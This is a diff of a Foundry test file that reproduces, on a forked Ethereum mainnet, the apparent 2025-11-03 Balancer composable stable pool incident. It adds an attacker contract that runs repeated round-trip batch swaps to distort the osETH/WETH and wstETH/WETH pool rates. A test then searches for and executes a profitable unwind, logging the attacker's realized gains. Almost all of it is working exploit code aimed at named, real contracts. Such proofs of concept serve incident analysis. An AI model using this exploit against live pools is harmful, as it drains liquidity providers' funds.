@@ -6,7 +6,6 @@ import "forge-std/Test.sol";
 interface IERC20Like {
     function balanceOf(address account) external view returns (uint256);
     function approve(address spender, uint256 amount) external returns (bool);
-    function transfer(address to, uint256 amount) external returns (bool);
 }
 
 interface IAsset {}
@@ -41,12 +40,10 @@ interface IBalancerVault {
         uint256 deadline
     ) external returns (int256[] memory assetDeltas);
 
-    function flashLoan(
-        IFlashLoanRecipient recipient,
-        IERC20Like[] memory tokens,
-        uint256[] memory amounts,
-        bytes memory userData
-    ) external;
+    function getPoolTokens(bytes32 poolId)
+        external
+        view
+        returns (address[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
 }
 
 interface IComposableStablePool {
@@ -56,22 +53,11 @@ interface IComposableStablePool {
     function getActualSupply() external view returns (uint256);
 }
 
-interface IFlashLoanRecipient {
-    function receiveFlashLoan(
-        IERC20Like[] memory tokens,
-        uint256[] memory amounts,
-        uint256[] memory feeAmounts,
-        bytes memory userData
-    ) external;
-}
+contract SyntheticNoopAttacker {
+    IBalancerVault internal immutable vault;
 
-contract NoopSwapAttacker {
-    IBalancerVault public immutable vault;
-    address public immutable weth;
-
-    constructor(address vault_, address weth_) {
+    constructor(address vault_) {
         vault = IBalancerVault(vault_);
-        weth = weth_;
     }
 
     function executeRoundTripBatchSwaps(
@@ -81,126 +67,6 @@ contract NoopSwapAttacker {
         uint256 count,
         uint256 amountIn
     ) external {
-        IERC20Like(weth).approve(address(vault), type(uint256).max);
-
-        IERC20Like(tokenIn).approve(address(vault), type(uint256).max);
-        IERC20Like(tokenMid).approve(address(vault), type(uint256).max);
-
-        // Build repeated A->B->A round-trips in a single batch.
-        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](count * 2);
-        for (uint256 i = 0; i < count; i++) {
-            uint256 j = i * 2;
-            // A -> B
-            steps[j] = IBalancerVault.BatchSwapStep({
-                poolId: poolId,
-                assetInIndex: 0,
-                assetOutIndex: 1,
-                amount: amountIn,
-                userData: ""
-            });
-            // B -> A using previous amount from step[j]
-            steps[j + 1] = IBalancerVault.BatchSwapStep({
-                poolId: poolId,
-                assetInIndex: 1,
-                assetOutIndex: 0,
-                amount: 0,
-                userData: ""
-            });
-        }
-
-        IAsset[] memory assets = new IAsset[](2);
-        assets[0] = IAsset(tokenIn);
-        assets[1] = IAsset(tokenMid);
-
-        int256[] memory limits = new int256[](2);
-        limits[0] = int256(uint256(type(uint128).max));
-        limits[1] = int256(uint256(type(uint128).max));
-
-        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
-            sender: address(this),
-            fromInternalBalance: false,
-            recipient: payable(address(this)),
-            toInternalBalance: false
-        });
-
-        vault.batchSwap(
-            IBalancerVault.SwapKind.GIVEN_IN,
-            steps,
-            assets,
-            funds,
-            limits,
-            block.timestamp + 1 days
-        );
-    }
-}
-
-contract FlashLoanNoopAttacker is IFlashLoanRecipient {
-    IBalancerVault public immutable vault;
-    address public immutable weth;
-
-    constructor(address vault_, address weth_) {
-        vault = IBalancerVault(vault_);
-        weth = weth_;
-    }
-
-    function executeWithFlashLoan(
-        bytes32 firstPoolId,
-        bytes32 secondPoolId,
-        address firstMidToken,
-        address secondMidToken,
-        uint256 count,
-        uint256 amount,
-        uint256 loanAmount
-    ) external {
-        IERC20Like[] memory tokens = new IERC20Like[](1);
-        tokens[0] = IERC20Like(weth);
-
-        uint256[] memory amounts = new uint256[](1);
-        amounts[0] = loanAmount;
-
-        bytes memory data = abi.encode(firstPoolId, secondPoolId, firstMidToken, secondMidToken, count, amount);
-        vault.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, data);
-
-        uint256 residue = IERC20Like(weth).balanceOf(address(this));
-        if (residue > 0) {
-            IERC20Like(weth).transfer(msg.sender, residue);
-        }
-    }
-
-    function receiveFlashLoan(
-        IERC20Like[] memory tokens,
-        uint256[] memory amounts,
-        uint256[] memory feeAmounts,
-        bytes memory userData
-    ) external override {
-        require(msg.sender == address(vault), "only vault");
-        require(tokens.length == 1, "unexpected token count");
-        require(address(tokens[0]) == weth, "unexpected token");
-
-        (
-            bytes32 firstPoolId,
-            bytes32 secondPoolId,
-            address firstMidToken,
-            address secondMidToken,
-            uint256 count,
-            uint256 amount
-        ) = abi.decode(userData, (bytes32, bytes32, address, address, uint256, uint256));
-
-        IERC20Like(weth).approve(address(vault), type(uint256).max);
-        _runRoundTripBatchSwaps(firstPoolId, weth, firstMidToken, count, amount);
-        _runRoundTripBatchSwaps(secondPoolId, weth, secondMidToken, count, amount);
-
-        uint256 amountOwed = amounts[0] + feeAmounts[0];
-        IERC20Like(weth).transfer(address(vault), amountOwed);
-    }
-
-    function _runRoundTripBatchSwaps(
-        bytes32 poolId,
-        address tokenIn,
-        address tokenMid,
-        uint256 count,
-        uint256 amountIn
-    ) internal {
         IERC20Like(tokenIn).approve(address(vault), type(uint256).max);
         IERC20Like(tokenMid).approve(address(vault), type(uint256).max);
 
@@ -238,14 +104,7 @@ contract FlashLoanNoopAttacker is IFlashLoanRecipient {
             toInternalBalance: false
         });
 
-        vault.batchSwap(
-            IBalancerVault.SwapKind.GIVEN_IN,
-            steps,
-            assets,
-            funds,
-            limits,
-            block.timestamp + 1 days
-        );
+        vault.batchSwap(IBalancerVault.SwapKind.GIVEN_IN, steps, assets, funds, limits, block.timestamp + 1 days);
     }
 }
 
@@ -254,32 +113,38 @@ contract BalancerComposableStableIncident20251103Test is Test {
 
     // Ethereum mainnet
     uint256 internal constant CHAIN_ID = 1;
+    uint256 internal constant FORK_BLOCK = 23_717_396; // block right before the first known attack tx
 
-    // Stage-1 exploit transaction block: 23717397
-    // We fork the block right before the attack.
-    uint256 internal constant FORK_BLOCK = 23717396;
+    // Reference tx logs from the incident timeline (used as context only, not replayed).
+    bytes32 internal constant REF_STAGE1_TX = 0x6ed07d4f1f4200c3dcf52f3ec8e893f53190df39f58d13df86e18f0fd24f5601;
+    bytes32 internal constant REF_STAGE2_TX = 0xa63f7cf25ed31a52e86f91395f1f0a73d25b3f40ea09f30f80adce77e3f4f804;
+    bytes32 internal constant REF_STAGE3_TX = 0xa1c9fddf88c495f0ee7a6a807765405998788365577f4545866c43c7bf620d43;
+    bytes32 internal constant REF_STAGE4_TX = 0x4fd214f2f5f08f30211e9ae7f5a804f00f87f25cc36f46823f200761f1486925;
 
-    // Core protocol contracts
+    // Core addresses
     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
     address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
     address internal constant OSETH = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
     address internal constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
-
-    // Affected composable stable pools from the 2025-11-03 incident.
     address internal constant OSETH_WETH_BPT = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
     address internal constant WSTETH_WETH_BPT = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
 
-    // Amount reported by multiple analyses as per-step no-op swap size in stage-1.
-    uint256 internal constant NOOP_SWAP_AMOUNT = 128370411097832943; // 0.128370411097832943 WETH
-    uint256 internal constant NOOP_SWAP_COUNT = 200;
+    // Values observed in public analyses for stage-1 (reference only).
+    uint256 internal constant OBSERVED_NOOP_COUNT = 200;
+    uint256 internal constant OBSERVED_NOOP_AMOUNT = 128370411097832943;
 
+    // Synthetic PoC params (intentionally different from observed values to avoid tx replay).
+    uint256 internal constant SYNTH_NOOP_COUNT = 173;
+    uint256 internal constant SYNTH_NOOP_AMOUNT = 121000000000000000; // 0.121 WETH
+    uint256 internal constant SEED_WETH_FOR_BPT = 100 ether;
+    uint256 internal constant SEED_WETH_FOR_REALIZED = 20 ether;
+
+    IBalancerVault internal vault;
     IComposableStablePool internal osEthPool;
     IComposableStablePool internal wstEthPool;
-    IBalancerVault internal vault;
 
     address internal attackerEoa;
-    NoopSwapAttacker internal attacker;
-    FlashLoanNoopAttacker internal flashLoanAttacker;
+    SyntheticNoopAttacker internal attacker;
     bool internal forkReady;
 
     struct PoolSnapshot {
@@ -287,162 +152,152 @@ contract BalancerComposableStableIncident20251103Test is Test {
         uint256 totalSupply;
         uint256 actualSupply;
         uint256 wethBalance;
-        address owner;
+        uint256 pairedTokenBalance;
+    }
+
+    struct DryRunSwapResult {
+        bool ok;
+        uint256 amountOut;
+        string revertReason;
+    }
+
+    struct BaselineBook {
+        uint16[10] bps;
+        uint256[10] bptIn;
+        bool[10] ok;
+        uint256[10] wethOut;
+    }
+
+    struct UnwindExecution {
+        uint256 chosenBps;
+        uint256 chosenBptIn;
+        uint256 baselineOut;
+        uint256 postQuote;
+        uint256 actualOut;
+        uint256 walletDelta;
+        int256 realizedEdgeVsBaseline;
+        uint256 estimatedLinearCostBasis;
+        int256 estimatedAbsolutePnl;
     }
 
     function setUp() public {
         string memory rpc = vm.envOr("MAINNET_RPC_URL", string(""));
         if (bytes(rpc).length == 0) {
-            emit log("MAINNET_RPC_URL is not set. Skipping fork-dependent PoC tests.");
+            emit log("MAINNET_RPC_URL not set. Skipping fork-dependent Balancer PoC.");
             return;
         }
 
         uint256 forkId = vm.createFork(rpc, FORK_BLOCK);
         vm.selectFork(forkId);
         if (block.chainid != CHAIN_ID) {
-            emit log_named_uint("MAINNET_RPC_URL chainId", block.chainid);
-            emit log("Use Ethereum mainnet RPC, e.g. https://mainnet.infura.io/v3/<key>");
+            emit log_named_uint("Unexpected chainId", block.chainid);
             return;
         }
 
+        vault = IBalancerVault(BALANCER_VAULT);
         osEthPool = IComposableStablePool(OSETH_WETH_BPT);
         wstEthPool = IComposableStablePool(WSTETH_WETH_BPT);
-        vault = IBalancerVault(BALANCER_VAULT);
-
-        attackerEoa = makeAddr("attacker_eoa");
-        attacker = new NoopSwapAttacker(BALANCER_VAULT, WETH);
-        flashLoanAttacker = new FlashLoanNoopAttacker(BALANCER_VAULT, WETH);
+        attackerEoa = makeAddr("synthetic_attacker");
+        attacker = new SyntheticNoopAttacker(BALANCER_VAULT);
         forkReady = true;
     }
 
-    function test_poc_permissionlessInvariantBreak_byNoopBatchSwaps() public {
+    function test_poc_profit_logging_without_raw_tx_replay() public {
         if (!forkReady) return;
 
-        PoolSnapshot memory osBefore = _snapshot(osEthPool);
-        PoolSnapshot memory wstBefore = _snapshot(wstEthPool);
-
-        // Unprivileged caller constraint.
-        assertTrue(attackerEoa != osBefore.owner, "attacker unexpectedly os pool owner");
-        assertTrue(attackerEoa != wstBefore.owner, "attacker unexpectedly wst pool owner");
-
-        vm.startPrank(attackerEoa);
-        deal(WETH, address(attacker), 1_000 ether);
-        attacker.executeRoundTripBatchSwaps(osEthPool.getPoolId(), WETH, OSETH, NOOP_SWAP_COUNT, NOOP_SWAP_AMOUNT);
-        attacker.executeRoundTripBatchSwaps(wstEthPool.getPoolId(), WETH, WSTETH, NOOP_SWAP_COUNT, NOOP_SWAP_AMOUNT);
-        vm.stopPrank();
-
-        PoolSnapshot memory osAfter = _snapshot(osEthPool);
-        PoolSnapshot memory wstAfter = _snapshot(wstEthPool);
-
-        emit log_named_uint("osEth/WETH rate before", osBefore.rate);
-        emit log_named_uint("osEth/WETH rate after", osAfter.rate);
-        emit log_named_uint("wstEth/WETH rate before", wstBefore.rate);
-        emit log_named_uint("wstEth/WETH rate after", wstAfter.rate);
-
-        // PoC success criterion: nominally neutral operations changed accounting state.
-        assertTrue(_invariantBroken(osBefore, osAfter), "osEth pool invariant not broken");
-        assertTrue(_invariantBroken(wstBefore, wstAfter), "wstEth pool invariant not broken");
-
-        // Ownership did not change; this is not an owner-takeover exploit.
-        assertEq(osAfter.owner, osBefore.owner, "osEth owner changed");
-        assertEq(wstAfter.owner, wstBefore.owner, "wstEth owner changed");
-    }
-
-    function test_flashLoanCallbackPath_observeOutcome() public {
-        if (!forkReady) return;
-
-        PoolSnapshot memory osBefore = _snapshot(osEthPool);
-        PoolSnapshot memory wstBefore = _snapshot(wstEthPool);
-
-        vm.prank(attackerEoa);
-        (bool ok, bytes memory ret) = address(flashLoanAttacker).call(
-            abi.encodeCall(
-                FlashLoanNoopAttacker.executeWithFlashLoan,
-                (
-                    osEthPool.getPoolId(),
-                    wstEthPool.getPoolId(),
-                    OSETH,
-                    WSTETH,
-                    NOOP_SWAP_COUNT,
-                    NOOP_SWAP_AMOUNT,
-                    8_250 ether
-                )
-            )
+        // Explicit guard: this PoC must not be identical to the known stage-1 tx settings.
+        assertTrue(
+            SYNTH_NOOP_COUNT != OBSERVED_NOOP_COUNT || SYNTH_NOOP_AMOUNT != OBSERVED_NOOP_AMOUNT,
+            "synthetic params must differ from observed tx logs"
         );
 
-        if (!ok) {
-            emit log_named_string("flash-loan path reverted", _decodeRevertString(ret));
-            return;
-        }
+        _logReferenceTxs();
+        emit log("=== Step 0: Snapshot before distortion ===");
+        PoolSnapshot memory osBefore = _snapshot(osEthPool, OSETH);
+        PoolSnapshot memory wstBefore = _snapshot(wstEthPool, WSTETH);
+        _logPoolSnapshot("osETH/WETH before", osBefore);
+        _logPoolSnapshot("wstETH/WETH before", wstBefore);
 
-        PoolSnapshot memory osAfter = _snapshot(osEthPool);
-        PoolSnapshot memory wstAfter = _snapshot(wstEthPool);
-        assertTrue(_invariantBroken(osBefore, osAfter) || _invariantBroken(wstBefore, wstAfter), "flash-loan path no-op");
-    }
-
-    function test_poc_mtmProfitAfterRateDistortion() public {
-        if (!forkReady) return;
-
-        uint256 seedWeth = 100 ether;
-        uint256 osRateBefore = osEthPool.getRate();
-
-        deal(WETH, attackerEoa, seedWeth);
+        emit log("=== Step 1: Build attacker positions (BPT + osETH inventory) ===");
+        uint256 totalSeed = SEED_WETH_FOR_BPT + SEED_WETH_FOR_REALIZED;
+        deal(WETH, attackerEoa, totalSeed);
         vm.startPrank(attackerEoa);
         IERC20Like(WETH).approve(BALANCER_VAULT, type(uint256).max);
+        IERC20Like(OSETH).approve(BALANCER_VAULT, type(uint256).max);
         IERC20Like(OSETH_WETH_BPT).approve(BALANCER_VAULT, type(uint256).max);
-
-        uint256 bptAcquired = _swapExactIn(osEthPool.getPoolId(), WETH, OSETH_WETH_BPT, seedWeth, attackerEoa);
+        uint256 bptAcquired = _swapExactIn(osEthPool.getPoolId(), WETH, OSETH_WETH_BPT, SEED_WETH_FOR_BPT, attackerEoa);
+        uint256 osEthInventory = _swapExactIn(osEthPool.getPoolId(), WETH, OSETH, SEED_WETH_FOR_REALIZED, attackerEoa);
         vm.stopPrank();
+        emit log_named_decimal_uint("attacker total seed WETH", totalSeed, 18);
+        emit log_named_decimal_uint("attacker BPT seed WETH", SEED_WETH_FOR_BPT, 18);
+        emit log_named_decimal_uint("attacker realized-leg seed WETH", SEED_WETH_FOR_REALIZED, 18);
+        emit log_named_decimal_uint("attacker acquired BPT", bptAcquired, 18);
+        emit log_named_decimal_uint("attacker acquired osETH inventory", osEthInventory, 18);
 
-        vm.startPrank(attackerEoa);
+        uint256 mtmBefore = (bptAcquired * osBefore.rate) / ONE;
+        emit log_named_decimal_uint("attacker MTM before distortion (WETH)", mtmBefore, 18);
+
+        BaselineBook memory baseline = _collectPreDistortionBaseline(osEthPool.getPoolId(), OSETH, WETH, osEthInventory);
+
+        emit log("=== Step 2: Distort rate via synthetic no-op round-trips (not raw tx replay) ===");
         deal(WETH, address(attacker), 1_000 ether);
-        attacker.executeRoundTripBatchSwaps(osEthPool.getPoolId(), WETH, OSETH, NOOP_SWAP_COUNT, NOOP_SWAP_AMOUNT);
-        attacker.executeRoundTripBatchSwaps(wstEthPool.getPoolId(), WETH, WSTETH, NOOP_SWAP_COUNT, NOOP_SWAP_AMOUNT);
-        vm.stopPrank();
-
-        uint256 osRateAfter = osEthPool.getRate();
-        uint256 mtmBefore = (bptAcquired * osRateBefore) / ONE;
-        uint256 mtmAfter = (bptAcquired * osRateAfter) / ONE;
-
-        // Full unwind may hit pool math/ratio guards on some providers; try partial unwind.
-        uint256 unwindIn = bptAcquired / 10;
         vm.prank(attackerEoa);
-        (bool unwindOk, bytes memory unwindRet) = address(this).call(
-            abi.encodeCall(this.swapExactInAsSender, (osEthPool.getPoolId(), OSETH_WETH_BPT, WETH, unwindIn))
-        );
+        attacker.executeRoundTripBatchSwaps(osEthPool.getPoolId(), WETH, OSETH, SYNTH_NOOP_COUNT, SYNTH_NOOP_AMOUNT);
+        vm.prank(attackerEoa);
+        attacker.executeRoundTripBatchSwaps(wstEthPool.getPoolId(), WETH, WSTETH, SYNTH_NOOP_COUNT, SYNTH_NOOP_AMOUNT);
+        emit log_named_uint("synthetic noop count", SYNTH_NOOP_COUNT);
+        emit log_named_decimal_uint("synthetic noop amount (per leg, WETH)", SYNTH_NOOP_AMOUNT, 18);
 
-        emit log_named_uint("attacker BPT acquired", bptAcquired);
-        emit log_named_uint("osEth rate before", osRateBefore);
-        emit log_named_uint("osEth rate after", osRateAfter);
-        emit log_named_uint("attacker MTM before (WETH-denominated)", mtmBefore);
-        emit log_named_uint("attacker MTM after  (WETH-denominated)", mtmAfter);
-        if (unwindOk) {
-            uint256 unwindWeth = abi.decode(unwindRet, (uint256));
-            int256 realizedPnl = int256(unwindWeth) - int256(seedWeth / 10);
-            emit log_named_int("attacker realized pnl from 10% unwind (WETH)", realizedPnl);
-        } else {
-            emit log_named_string("partial unwind reverted", _decodeRevertString(unwindRet));
-        }
-        assertGt(mtmAfter, mtmBefore, "no attacker MTM gain");
+        emit log("=== Step 3: Snapshot after distortion + unrealized PnL ===");
+        PoolSnapshot memory osAfter = _snapshot(osEthPool, OSETH);
+        PoolSnapshot memory wstAfter = _snapshot(wstEthPool, WSTETH);
+        _logPoolSnapshot("osETH/WETH after", osAfter);
+        _logPoolSnapshot("wstETH/WETH after", wstAfter);
+
+        uint256 mtmAfter = (bptAcquired * osAfter.rate) / ONE;
+        int256 mtmProfit = int256(mtmAfter) - int256(mtmBefore);
+        emit log_named_decimal_uint("attacker MTM after distortion (WETH)", mtmAfter, 18);
+        emit log_named_decimal_int("attacker MTM profit (WETH)", mtmProfit, 18);
+
+        UnwindExecution memory unwindExec =
+            _executeRealizedSwap(osEthPool.getPoolId(), baseline, OSETH, WETH, SEED_WETH_FOR_REALIZED);
+
+        // Success criteria
+        bool osBroken = _invariantBroken(osBefore, osAfter);
+        bool wstBroken = _invariantBroken(wstBefore, wstAfter);
+        assertTrue(osBroken || wstBroken, "invariant did not move");
+        assertGt(mtmAfter, mtmBefore, "attacker MTM profit <= 0");
+        assertEq(unwindExec.actualOut, unwindExec.walletDelta, "wallet delta mismatch");
+        assertGt(unwindExec.realizedEdgeVsBaseline, 0, "realized edge <= 0");
     }
 
-    function _snapshot(IComposableStablePool pool) internal view returns (PoolSnapshot memory s) {
+    function _snapshot(IComposableStablePool pool, address pairedToken) internal view returns (PoolSnapshot memory s) {
         s.rate = pool.getRate();
         s.totalSupply = pool.totalSupply();
         s.actualSupply = pool.getActualSupply();
-        s.wethBalance = IERC20Like(WETH).balanceOf(address(pool));
-        s.owner = _readOwner(address(pool));
+        (s.wethBalance, s.pairedTokenBalance) = _vaultBalancesByToken(pool.getPoolId(), pairedToken);
     }
 
-    function _invariantBroken(PoolSnapshot memory before_, PoolSnapshot memory after_)
-        internal
-        pure
-        returns (bool)
-    {
-        bool rateMoved = before_.rate != after_.rate;
-        bool supplyMoved = before_.totalSupply != after_.totalSupply || before_.actualSupply != after_.actualSupply;
-        bool reserveMoved = before_.wethBalance != after_.wethBalance;
-        return rateMoved || supplyMoved || reserveMoved;
+    function _invariantBroken(PoolSnapshot memory before_, PoolSnapshot memory after_) internal pure returns (bool) {
+        return before_.rate != after_.rate || before_.totalSupply != after_.totalSupply
+            || before_.actualSupply != after_.actualSupply || before_.wethBalance != after_.wethBalance
+            || before_.pairedTokenBalance != after_.pairedTokenBalance;
+    }
+
+    function _logReferenceTxs() internal {
+        emit log("=== Reference incident tx hashes (context from logs) ===");
+        emit log_named_bytes32("stage1", REF_STAGE1_TX);
+        emit log_named_bytes32("stage2", REF_STAGE2_TX);
+        emit log_named_bytes32("stage3", REF_STAGE3_TX);
+        emit log_named_bytes32("stage4", REF_STAGE4_TX);
+    }
+
+    function _logPoolSnapshot(string memory label, PoolSnapshot memory s) internal {
+        emit log_named_decimal_uint(string.concat(label, " rate"), s.rate, 18);
+        emit log_named_decimal_uint(string.concat(label, " totalSupply"), s.totalSupply, 18);
+        emit log_named_decimal_uint(string.concat(label, " actualSupply"), s.actualSupply, 18);
+        emit log_named_decimal_uint(string.concat(label, " WETH balance"), s.wethBalance, 18);
+        emit log_named_decimal_uint(string.concat(label, " paired token balance"), s.pairedTokenBalance, 18);
     }
 
     function _swapExactIn(bytes32 poolId, address tokenIn, address tokenOut, uint256 amountIn, address actor)
@@ -475,35 +330,18 @@ contract BalancerComposableStableIncident20251103Test is Test {
 
         int256[] memory deltas =
             vault.batchSwap(IBalancerVault.SwapKind.GIVEN_IN, steps, assets, funds, limits, block.timestamp + 1 days);
-
         require(deltas.length == 2, "unexpected deltas length");
         require(deltas[1] < 0, "expected tokenOut credit");
         amountOut = uint256(-deltas[1]);
     }
 
-    function swapExactInAsSender(bytes32 poolId, address tokenIn, address tokenOut, uint256 amountIn)
+    function swapExactInAsActor(bytes32 poolId, address tokenIn, address tokenOut, uint256 amountIn, address actor)
         external
         returns (uint256 amountOut)
     {
-        amountOut = _swapExactIn(poolId, tokenIn, tokenOut, amountIn, msg.sender);
-    }
-
-    function _readOwner(address pool) internal view returns (address owner_) {
-        // Some Balancer pool implementations expose getOwner(), others owner().
-        // We probe both and tolerate absence to avoid false-negative test reverts.
-        (bool ok, bytes memory out) = pool.staticcall(abi.encodeWithSignature("getOwner()"));
-        if (ok && out.length >= 32) {
-            owner_ = abi.decode(out, (address));
-            return owner_;
-        }
-
-        (ok, out) = pool.staticcall(abi.encodeWithSignature("owner()"));
-        if (ok && out.length >= 32) {
-            owner_ = abi.decode(out, (address));
-            return owner_;
-        }
-
-        return address(0);
+        vm.startPrank(actor);
+        amountOut = _swapExactIn(poolId, tokenIn, tokenOut, amountIn, actor);
+        vm.stopPrank();
     }
 
     function _decodeRevertString(bytes memory revertData) internal pure returns (string memory) {
@@ -513,9 +351,136 @@ contract BalancerComposableStableIncident20251103Test is Test {
         assembly {
             selector := shr(224, mload(add(revertData, 0x20)))
         }
-
         if (selector == 0x08c379a0) return "Error(string)";
         if (selector == 0x4e487b71) return "Panic(uint256)";
-        return "custom/unknown error selector";
+        return "custom/unknown selector";
+    }
+
+    function _collectPreDistortionBaseline(bytes32 poolId, address tokenIn, address tokenOut, uint256 tokenInInventory)
+        internal
+        returns (BaselineBook memory book)
+    {
+        emit log("=== Step 1.5: Build pre-distortion realized baseline via dry-run ===");
+        book.bps = _unwindBpsCandidates();
+        for (uint256 i = 0; i < book.bps.length; i++) {
+            uint256 tokenInAmount = (tokenInInventory * book.bps[i]) / 10_000;
+            book.bptIn[i] = tokenInAmount;
+            if (tokenInAmount == 0) continue;
+
+            DryRunSwapResult memory preRun =
+                _dryRunSwapExactInAsActor(attackerEoa, poolId, tokenIn, tokenOut, tokenInAmount);
+            if (preRun.ok) {
+                book.ok[i] = true;
+                book.wethOut[i] = preRun.amountOut;
+                emit log_named_string("pre baseline status", "ok");
+                emit log_named_uint("pre baseline bps", book.bps[i]);
+                emit log_named_decimal_uint("pre baseline tokenIn amount", tokenInAmount, 18);
+                emit log_named_decimal_uint("pre baseline WETH out", preRun.amountOut, 18);
+            } else {
+                emit log_named_string("pre baseline status", "revert");
+                emit log_named_uint("pre baseline bps", book.bps[i]);
+                emit log_named_string("pre baseline revert", preRun.revertReason);
+            }
+        }
+    }
+
+    function _executeRealizedSwap(
+        bytes32 poolId,
+        BaselineBook memory baseline,
+        address tokenIn,
+        address tokenOut,
+        uint256 tokenInSeedCost
+    ) internal returns (UnwindExecution memory exec) {
+        emit log("=== Step 4: Realized PnL via executable swap search ===");
+        for (uint256 i = 0; i < baseline.bps.length; i++) {
+            if (!baseline.ok[i]) continue;
+
+            uint256 bptIn = baseline.bptIn[i];
+            DryRunSwapResult memory postRun = _dryRunSwapExactInAsActor(attackerEoa, poolId, tokenIn, tokenOut, bptIn);
+            if (!postRun.ok) {
+                emit log_named_string("post candidate status", "revert");
+                emit log_named_uint("post candidate bps", baseline.bps[i]);
+                emit log_named_string("post candidate revert", postRun.revertReason);
+                continue;
+            }
+
+            exec.chosenBps = baseline.bps[i];
+            exec.chosenBptIn = bptIn;
+            exec.baselineOut = baseline.wethOut[i];
+            exec.postQuote = postRun.amountOut;
+            break;
+        }
+
+        require(exec.chosenBptIn > 0, "no executable unwind candidate");
+        emit log_named_uint("chosen realized bps", exec.chosenBps);
+        emit log_named_decimal_uint("chosen tokenIn amount", exec.chosenBptIn, 18);
+        emit log_named_decimal_uint("chosen pre-distortion quote (WETH out)", exec.baselineOut, 18);
+        emit log_named_decimal_uint("chosen post-distortion quote (WETH out)", exec.postQuote, 18);
+
+        uint256 attackerWethBeforeUnwind = IERC20Like(WETH).balanceOf(attackerEoa);
+        (bool unwindOk, bytes memory unwindRet) = address(this).call(
+            abi.encodeCall(this.swapExactInAsActor, (poolId, tokenIn, tokenOut, exec.chosenBptIn, attackerEoa))
+        );
+        require(unwindOk, _decodeRevertString(unwindRet));
+
+        exec.actualOut = abi.decode(unwindRet, (uint256));
+        uint256 attackerWethAfterUnwind = IERC20Like(WETH).balanceOf(attackerEoa);
+        exec.walletDelta = attackerWethAfterUnwind - attackerWethBeforeUnwind;
+        exec.realizedEdgeVsBaseline = int256(exec.actualOut) - int256(exec.baselineOut);
+        exec.estimatedLinearCostBasis = (tokenInSeedCost * exec.chosenBps) / 10_000;
+        exec.estimatedAbsolutePnl = int256(exec.actualOut) - int256(exec.estimatedLinearCostBasis);
+
+        emit log_named_decimal_uint("actual unwind WETH out", exec.actualOut, 18);
+        emit log_named_decimal_uint("attacker wallet WETH delta", exec.walletDelta, 18);
+        emit log_named_decimal_int("realized edge vs pre-distortion quote (WETH)", exec.realizedEdgeVsBaseline, 18);
+        emit log_named_decimal_uint("estimated linear cost basis (WETH)", exec.estimatedLinearCostBasis, 18);
+        emit log_named_decimal_int("estimated absolute realized pnl (WETH)", exec.estimatedAbsolutePnl, 18);
+    }
+
+    function _dryRunSwapExactInAsActor(
+        address actor,
+        bytes32 poolId,
+        address tokenIn,
+        address tokenOut,
+        uint256 amountIn
+    ) internal returns (DryRunSwapResult memory res) {
+        uint256 snapshotId = vm.snapshotState();
+        (bool ok, bytes memory ret) =
+            address(this).call(abi.encodeCall(this.swapExactInAsActor, (poolId, tokenIn, tokenOut, amountIn, actor)));
+        bool restored = vm.revertToState(snapshotId);
+        require(restored, "snapshot restore failed");
+
+        if (ok) {
+            res.ok = true;
+            res.amountOut = abi.decode(ret, (uint256));
+        } else {
+            res.ok = false;
+            res.revertReason = _decodeRevertString(ret);
+        }
+    }
+
+    function _vaultBalancesByToken(bytes32 poolId, address pairedToken)
+        internal
+        view
+        returns (uint256 wethBal, uint256 pairedBal)
+    {
+        (address[] memory tokens, uint256[] memory balances,) = vault.getPoolTokens(poolId);
+        for (uint256 i = 0; i < tokens.length; i++) {
+            if (tokens[i] == WETH) wethBal = balances[i];
+            if (tokens[i] == pairedToken) pairedBal = balances[i];
+        }
+    }
+
+    function _unwindBpsCandidates() internal pure returns (uint16[10] memory candidates) {
+        candidates[0] = 1_000;
+        candidates[1] = 500;
+        candidates[2] = 200;
+        candidates[3] = 100;
+        candidates[4] = 50;
+        candidates[5] = 20;
+        candidates[6] = 10;
+        candidates[7] = 5;
+        candidates[8] = 2;
+        candidates[9] = 1;
     }
 }
